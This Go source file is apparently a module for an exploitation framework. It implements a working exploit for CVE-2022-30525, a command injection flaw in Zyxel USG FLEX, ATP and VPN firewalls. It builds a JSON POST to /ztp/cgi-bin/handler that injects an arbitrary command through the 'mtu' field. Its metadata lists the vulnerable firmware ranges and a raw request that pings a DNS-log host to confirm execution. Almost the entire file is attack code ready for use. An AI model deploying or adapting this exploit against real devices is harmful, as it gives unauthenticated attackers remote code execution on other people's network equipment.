package exp_zyxel

import (
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/common"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"strings"
)

type Exp_CVE_2022_30525 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2022_30525) Cmd1(cmd string) (expResult exp_model.ExpResult) {
	self.Params.Timeout = self.Params.Timeout * 2
	headers := self.GetInitExpHeaders()                                                                                        //获取自定义Header
	headers.Set("Content-Type", "application/json")                                                                            //设置漏洞所需Header
	payload := `{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":";xcx;","data":"hi"}` //原始exp
	payload = strings.Replace(payload, "xcx", cmd, 1)                                                                          //构造exp
	httpresp := self.HttpPostWithoutRedirect(self.AppendUri(self.Params.Target, "/ztp/cgi-bin/handler"), payload, headers)     //发送post请求
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	self.EchoInfoMsg("执行成功，该漏洞无回显，请检查命令执行结果！") //该漏洞HTTP无回显故直接返回
	return
}

func init() {
	expmsg := exp_model.ExpMsg{
		Author: "小晨曦",
		Time:   `2022-05-13`,
		Range: `USG FLEX 100, 100W, 200, 500, 700：ZLD5.00 到 ZLD5.21 Patch 1
USG20-VPN, USG20W-VPN：ZLD5.10 到 ZLD5.21 Patch 1
ATP 100, 200, 500, 700, 800：ZLD5.10 到 ZLD5.21 Patch 1`,
		ID:       `CVE-2022-30525`,
		Describe: `Zyxel 防火墙中的命令注入漏洞，该漏洞影响支持零接触配置 (ZTP) 的 Zyxel 防火墙，其中包括 ATP 系列、VPN 系列和 USG FLEX 系列（包括 USG20-VPN 和 USG20W-VPN）。该漏洞标识为 CVE-2022-30525，允许未经身份验证的远程攻击者以 nobody 受影响设备上的用户身份执行任意代码。`,
		Details:  `输入命令执行即可，无回显`,
		Payload: `
POST /ztp/cgi-bin/handler HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Content-Type: application/json
Connection: close
Content-Length: 122

{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged"
:"1","vlanid":"5","mtu":"; ping {DNSlog};","data":"hi"}
`,
		VulType: common.VulCmdExec,
	}

	registerMsg := exp_register.ExpRegisterMsg{
		Msg: expmsg,
	}
	exp_register.ExpStructRegister(&Exp_CVE_2022_30525{}, registerMsg)

}
